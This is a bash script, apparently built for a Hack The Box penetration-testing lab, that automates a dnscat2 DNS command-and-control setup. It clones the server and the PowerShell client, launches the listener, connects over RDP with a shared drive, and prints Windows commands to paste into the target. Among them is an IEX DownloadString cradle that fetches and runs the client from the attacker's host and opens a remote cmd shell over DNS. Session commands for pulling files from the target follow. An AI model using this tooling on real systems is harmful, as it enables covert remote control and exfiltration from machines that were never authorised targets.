#!/bin/bash

#═══════════════════════════════════════════════════════════════════════════════
#  DNSCAT2 AUTOMATED SETUP & DEPLOYMENT SCRIPT
#  For Penetration Testing Engagements
#═══════════════════════════════════════════════════════════════════════════════

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color
BOLD='\033[1m'

# Banner
print_banner() {
    echo -e "${CYAN}"
    cat << 'EOF'
    ╔═══════════════════════════════════════════════════════════════╗
    ║     ____  _   _ ____   ____    _  _____ ____                  ║
    ║    |  _ \| \ | / ___| / ___|  / \|_   _|___ \                 ║
    ║    | | | |  \| \___ \| |     / _ \ | |   __) |                ║
    ║    | |_| | |\  |___) | |___ / ___ \| |  / __/                 ║
    ║    |____/|_| \_|____/ \____/_/   \_\_| |_____|                ║
    ║                                                               ║
    ║           AUTOMATED SETUP & DEPLOYMENT SCRIPT                 ║
    ╚═══════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

# Logging functions
log_info() { echo -e "${BLUE}[*]${NC} $1"; }
log_success() { echo -e "${GREEN}[+]${NC} $1"; }
log_warning() { echo -e "${YELLOW}[!]${NC} $1"; }
log_error() { echo -e "${RED}[-]${NC} $1"; }
log_input() { echo -e "${MAGENTA}[?]${NC} $1"; }

# Separator
separator() {
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

# Detect primary network interface and IP
detect_network() {
    log_info "Detecting network configuration..."
    
    # Try to get the default route interface
    DEFAULT_IFACE=$(ip route | grep default | awk '{print $5}' | head -n1)
    
    if [[ -n "$DEFAULT_IFACE" ]]; then
        LOCAL_IP=$(ip -4 addr show "$DEFAULT_IFACE" | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -n1)
    fi
    
    # Fallback: try common VPN/tunnel interfaces for HTB
    if [[ -z "$LOCAL_IP" ]]; then
        for iface in tun0 tun1 tap0 eth0 ens33 ens160; do
            LOCAL_IP=$(ip -4 addr show "$iface" 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -n1)
            [[ -n "$LOCAL_IP" ]] && DEFAULT_IFACE="$iface" && break
        done
    fi
    
    if [[ -z "$LOCAL_IP" ]]; then
        log_warning "Could not auto-detect IP address"
        read -rp "Enter your attack host IP: " LOCAL_IP
    else
        log_success "Detected Interface: $DEFAULT_IFACE"
        log_success "Detected IP: $LOCAL_IP"
        read -rp "Use this IP? [Y/n]: " confirm
        if [[ "$confirm" =~ ^[Nn] ]]; then
            read -rp "Enter your attack host IP: " LOCAL_IP
        fi
    fi
}

# Get target information
get_target_info() {
    separator
    echo -e "${BOLD}${WHITE}TARGET CONFIGURATION${NC}"
    separator
    
    read -rp "Target IP (RDP host): " TARGET_IP
    read -rp "RDP Username [htb-student]: " RDP_USER
    RDP_USER=${RDP_USER:-htb-student}
    read -rsp "RDP Password: " RDP_PASS
    echo
    read -rp "DNS Domain [inlanefreight.local]: " DNS_DOMAIN
    DNS_DOMAIN=${DNS_DOMAIN:-inlanefreight.local}
    read -rp "DNS Port [53]: " DNS_PORT
    DNS_PORT=${DNS_PORT:-53}
}

# Setup working directory
setup_workspace() {
    separator
    echo -e "${BOLD}${WHITE}WORKSPACE SETUP${NC}"
    separator
    
    WORK_DIR="$HOME/dnscat2-workspace"
    log_info "Creating workspace at: $WORK_DIR"
    mkdir -p "$WORK_DIR"
    cd "$WORK_DIR"
    
    # Clone repositories if not exists
    if [[ ! -d "dnscat2" ]]; then
        log_info "Cloning dnscat2 server..."
        git clone https://github.com/iagox86/dnscat2.git 2>/dev/null || {
            log_error "Failed to clone dnscat2 server"
            exit 1
        }
        log_success "dnscat2 server cloned"
    else
        log_success "dnscat2 server already exists"
    fi
    
    if [[ ! -d "dnscat2-powershell" ]]; then
        log_info "Cloning dnscat2-powershell client..."
        git clone https://github.com/lukebaggett/dnscat2-powershell.git 2>/dev/null || {
            log_error "Failed to clone dnscat2-powershell"
            exit 1
        }
        log_success "dnscat2-powershell client cloned"
    else
        log_success "dnscat2-powershell client already exists"
    fi
    
    # Find the PowerShell script
    PS_SCRIPT=$(find dnscat2-powershell -type f -name "*.ps1" | head -n1)
    if [[ -z "$PS_SCRIPT" ]]; then
        log_error "Could not find dnscat2 PowerShell script!"
        exit 1
    fi
    log_success "Found PowerShell script: $PS_SCRIPT"
}

# Install dependencies
install_dependencies() {
    separator
    echo -e "${BOLD}${WHITE}INSTALLING DEPENDENCIES${NC}"
    separator
    
    cd "$WORK_DIR/dnscat2/server"
    
    if ! command -v bundle &>/dev/null; then
        log_info "Installing bundler..."
        sudo gem install bundler
    fi
    
    log_info "Installing Ruby dependencies..."
    sudo bundle install 2>/dev/null || {
        log_warning "Bundle install had some issues, attempting to continue..."
    }
    log_success "Dependencies installed"
    
    cd "$WORK_DIR"
}

# Generate PowerShell commands
generate_windows_commands() {
    separator
    echo -e "${BOLD}${WHITE}WINDOWS COMMANDS - COPY & PASTE INTO TARGET${NC}"
    separator
    
    # Get the script filename
    PS_FILENAME=$(basename "$PS_SCRIPT")
    
    echo -e "${YELLOW}"
    cat << EOF
┌─────────────────────────────────────────────────────────────────────┐
│  STEP 1: Import the Module (navigate to shared drive first)        │
└─────────────────────────────────────────────────────────────────────┘
EOF
    echo -e "${NC}"
    
    CMD1="Import-Module \\\\tsclient\\shared\\${PS_FILENAME}"
    echo -e "${GREEN}${CMD1}${NC}"
    echo
    
    echo -e "${YELLOW}"
    cat << EOF
┌─────────────────────────────────────────────────────────────────────┐
│  STEP 2: Start dnscat2 Connection                                  │
└─────────────────────────────────────────────────────────────────────┘
EOF
    echo -e "${NC}"
    
    # Note: PreSharedSecret will be captured from server output
    CMD2="Start-Dnscat2 -DNSserver ${LOCAL_IP} -Domain ${DNS_DOMAIN} -PreSharedSecret <SECRET_FROM_SERVER> -Exec cmd"
    echo -e "${GREEN}${CMD2}${NC}"
    echo
    
    echo -e "${YELLOW}"
    cat << EOF
┌─────────────────────────────────────────────────────────────────────┐
│  ALTERNATIVE: One-liner (Download & Execute)                       │
└─────────────────────────────────────────────────────────────────────┘
EOF
    echo -e "${NC}"
    
    ONELINER="IEX(New-Object Net.WebClient).DownloadString('http://${LOCAL_IP}:8080/${PS_FILENAME}'); Start-Dnscat2 -DNSserver ${LOCAL_IP} -Domain ${DNS_DOMAIN} -PreSharedSecret <SECRET> -Exec cmd"
    echo -e "${GREEN}${ONELINER}${NC}"
    echo
    
    # Save commands to file
    CMDS_FILE="$WORK_DIR/windows_commands.txt"
    cat > "$CMDS_FILE" << EOF
================================================================================
DNSCAT2 WINDOWS COMMANDS - Generated $(date)
================================================================================

TARGET: ${TARGET_IP}
ATTACK HOST: ${LOCAL_IP}
DOMAIN: ${DNS_DOMAIN}

--------------------------------------------------------------------------------
STEP 1: Import Module (from RDP shared drive)
--------------------------------------------------------------------------------
${CMD1}

--------------------------------------------------------------------------------
STEP 2: Start Connection (replace <SECRET> with PreSharedSecret from server)
--------------------------------------------------------------------------------
Start-Dnscat2 -DNSserver ${LOCAL_IP} -Domain ${DNS_DOMAIN} -PreSharedSecret <REPLACE_WITH_SECRET> -Exec cmd

--------------------------------------------------------------------------------
ALTERNATIVE: One-liner via HTTP (start python HTTP server first)
--------------------------------------------------------------------------------
python3 -m http.server 8080 --directory ${WORK_DIR}/dnscat2-powershell

${ONELINER}

================================================================================
EOF
    
    log_success "Commands saved to: $CMDS_FILE"
}

# Display session commands
show_session_commands() {
    separator
    echo -e "${BOLD}${WHITE}SESSION INTERACTION COMMANDS${NC}"
    separator
    
    echo -e "${CYAN}Once you have a session:${NC}"
    echo -e "  ${GREEN}sessions${NC}           - List all sessions"
    echo -e "  ${GREEN}window -i 1${NC}        - Interact with session 1"
    echo -e "  ${GREEN}session -i 1${NC}       - Alternative way to interact"
    echo -e "  ${GREEN}shell${NC}              - Spawn a shell in current session"
    echo -e "  ${GREEN}download <file>${NC}   - Download file from target"
    echo -e "  ${GREEN}upload <file>${NC}     - Upload file to target"
    echo -e "  ${GREEN}suspend${NC}           - Background current session"
    echo -e "  ${GREEN}quit${NC}              - Exit dnscat2"
    echo
}

# Launch sequence
launch_sequence() {
    separator
    echo -e "${BOLD}${WHITE}LAUNCH SEQUENCE${NC}"
    separator
    
    PS_DIR=$(dirname "$WORK_DIR/$PS_SCRIPT")
    
    echo -e "${CYAN}The following will be launched in separate terminals:${NC}"
    echo -e "  1. ${GREEN}dnscat2 server${NC} (DNS listener)"
    echo -e "  2. ${GREEN}xfreerdp${NC} (RDP with shared folder)"
    echo -e "  3. ${GREEN}HTTP server${NC} (optional, for download cradle)"
    echo
    
    read -rp "Launch dnscat2 server now? [Y/n]: " launch_server
    
    if [[ ! "$launch_server" =~ ^[Nn] ]]; then
        log_info "Launching dnscat2 server..."
        
        # Build the server command
        SERVER_CMD="cd $WORK_DIR/dnscat2/server && sudo ruby dnscat2.rb --dns host=${LOCAL_IP},port=${DNS_PORT},domain=${DNS_DOMAIN} --no-cache"
        
        # Try different terminal emulators
        if command -v gnome-terminal &>/dev/null; then
            gnome-terminal --title="DNSCAT2 SERVER" -- bash -c "$SERVER_CMD; exec bash" &
        elif command -v xterm &>/dev/null; then
            xterm -title "DNSCAT2 SERVER" -e "$SERVER_CMD; bash" &
        elif command -v konsole &>/dev/null; then
            konsole --new-tab -e bash -c "$SERVER_CMD; exec bash" &
        else
            log_warning "No supported terminal found. Run manually:"
            echo -e "${GREEN}$SERVER_CMD${NC}"
        fi
        
        sleep 2
        log_success "Server launched! Check the new terminal for the PreSharedSecret"
    fi
    
    echo
    read -rp "Launch RDP connection now? [Y/n]: " launch_rdp
    
    if [[ ! "$launch_rdp" =~ ^[Nn] ]]; then
        log_info "Launching RDP connection..."
        
        # Build RDP command with shared folder pointing to powershell client
        RDP_CMD="xfreerdp /v:${TARGET_IP} /u:${RDP_USER} /p:'${RDP_PASS}' /drive:shared,'${PS_DIR}' /dynamic-resolution /cert:ignore"
        
        eval "$RDP_CMD" &
        
        log_success "RDP launched! The PowerShell script is available at \\\\tsclient\\shared\\"
    fi
    
    echo
    read -rp "Start HTTP server for download cradle? [y/N]: " launch_http
    
    if [[ "$launch_http" =~ ^[Yy] ]]; then
        log_info "Starting HTTP server on port 8080..."
        
        if command -v gnome-terminal &>/dev/null; then
            gnome-terminal --title="HTTP SERVER" -- bash -c "cd '$PS_DIR' && python3 -m http.server 8080; exec bash" &
        elif command -v xterm &>/dev/null; then
            xterm -title "HTTP SERVER" -e "cd '$PS_DIR' && python3 -m http.server 8080; bash" &
        else
            log_warning "Run manually: cd '$PS_DIR' && python3 -m http.server 8080"
        fi
        
        log_success "HTTP server started at http://${LOCAL_IP}:8080/"
    fi
}

# Interactive menu for post-setup
interactive_menu() {
    while true; do
        separator
        echo -e "${BOLD}${WHITE}DNSCAT2 CONTROL PANEL${NC}"
        separator
        echo -e "  ${CYAN}1)${NC} Show Windows commands (copy/paste)"
        echo -e "  ${CYAN}2)${NC} Regenerate with new settings"
        echo -e "  ${CYAN}3)${NC} Launch dnscat2 server"
        echo -e "  ${CYAN}4)${NC} Launch RDP connection"
        echo -e "  ${CYAN}5)${NC} Start HTTP server"
        echo -e "  ${CYAN}6)${NC} Show session interaction commands"
        echo -e "  ${CYAN}7)${NC} Open commands file"
        echo -e "  ${CYAN}q)${NC} Quit"
        echo
        read -rp "Select option: " choice
        
        case $choice in
            1) generate_windows_commands ;;
            2) get_target_info; generate_windows_commands ;;
            3) 
                SERVER_CMD="cd $WORK_DIR/dnscat2/server && sudo ruby dnscat2.rb --dns host=${LOCAL_IP},port=${DNS_PORT},domain=${DNS_DOMAIN} --no-cache"
                if command -v gnome-terminal &>/dev/null; then
                    gnome-terminal --title="DNSCAT2 SERVER" -- bash -c "$SERVER_CMD; exec bash" &
                else
                    log_info "Run: $SERVER_CMD"
                fi
                ;;
            4)
                PS_DIR=$(dirname "$WORK_DIR/$PS_SCRIPT")
                xfreerdp /v:${TARGET_IP} /u:${RDP_USER} /p:"${RDP_PASS}" /drive:shared,"${PS_DIR}" /dynamic-resolution /cert:ignore &
                ;;
            5)
                PS_DIR=$(dirname "$WORK_DIR/$PS_SCRIPT")
                cd "$PS_DIR" && python3 -m http.server 8080 &
                log_success "HTTP server started"
                ;;
            6) show_session_commands ;;
            7) 
                if command -v xdg-open &>/dev/null; then
                    xdg-open "$WORK_DIR/windows_commands.txt" 2>/dev/null &
                else
                    cat "$WORK_DIR/windows_commands.txt"
                fi
                ;;
            q|Q) 
                log_info "Goodbye!"
                exit 0 
                ;;
            *) log_warning "Invalid option" ;;
        esac
    done
}

# Cleanup function
cleanup() {
    log_warning "Cleaning up..."
    # Kill any background processes if needed
}

trap cleanup EXIT

# Main execution
main() {
    clear
    print_banner
    
    # Check for required tools
    for tool in git ruby xfreerdp; do
        if ! command -v "$tool" &>/dev/null; then
            log_error "Required tool not found: $tool"
            exit 1
        fi
    done
    
    detect_network
    get_target_info
    setup_workspace
    install_dependencies
    generate_windows_commands
    show_session_commands
    
    echo
    read -rp "Proceed to launch sequence? [Y/n]: " proceed
    
    if [[ ! "$proceed" =~ ^[Nn] ]]; then
        launch_sequence
    fi
    
    echo
    log_success "Setup complete!"
    echo
    read -rp "Enter interactive control panel? [Y/n]: " panel
    
    if [[ ! "$panel" =~ ^[Nn] ]]; then
        interactive_menu
    fi
}

# Run
main "$@"
